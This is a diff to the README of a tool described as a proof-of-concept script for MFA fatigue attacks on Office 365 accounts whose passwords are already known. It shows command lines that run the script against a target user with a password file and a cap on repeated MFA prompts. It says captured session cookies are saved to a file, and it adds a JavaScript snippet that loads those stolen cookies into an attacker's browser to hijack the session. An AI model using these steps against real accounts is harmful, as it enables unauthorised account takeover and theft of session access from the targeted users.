@@ -16,6 +16,7 @@ A proof-of-concept Python script to cause MFA fatigue for known O365 credentials
   - [Additional Setup Notes](#additional-setup-notes)
 - [Usage](#usage)
   - [Quick Start](#quick-start)
+  - [Usage Notes](#usage-notes)
   - [CLI Help](#cli-help)
 - [To Do](#to-do)
 
@@ -110,11 +111,19 @@ python3 ./mfatigue.py -u targetuser@randomtestdomain.com -spf ./password.txt
 python3 ./mfatigue.py -u targetuser@randomtestdomain.com -spf ./password.txt -max-mfa 10 --max-mfa-wait 30
 ```
 
-Once an authenticated user session is captured, the script will ask whether you want to keep the authenticated browser session open. Alternatively, the captured session cookies will be written to `.\captured_mfa_authed_sesisons.txt`. An example is shown on the screenshot below:
+## Usage Notes
+Once an authenticated user session is captured, the script will ask whether you want to keep the authenticated browser session open. <br /> <br />
+Alternatively, the captured session cookies will be written to `.\captured_mfa_authed_sesisons.txt`. An example is shown on the screenshot below:
 <h2 align="center">
-  <img src="static/captured_mfa_authed_sesisons.png" alt="captured_mfa_authed_sesisons" width="80%">
+  <img src="static/captured_mfa_authed_sesisons.png" alt="captured_mfa_authed_sesisons" width="70%">
   <br>
 </h2>
+
+Now you can import the captured session cookies to your browser by using the following JavaScript:
+```js
+var obj = JSON.parse('PASTE_JSON_BLOB_FROM_CAPTURED_SESSION');
+for (let i = 0; i < obj.length; i++) { document.cookie= obj[i].name+"="+obj[i].value+"; expires=Wed, 05 Aug 2040 23:00:00 UTC; path=/"; }
+```
 
 ## CLI Help
 ```
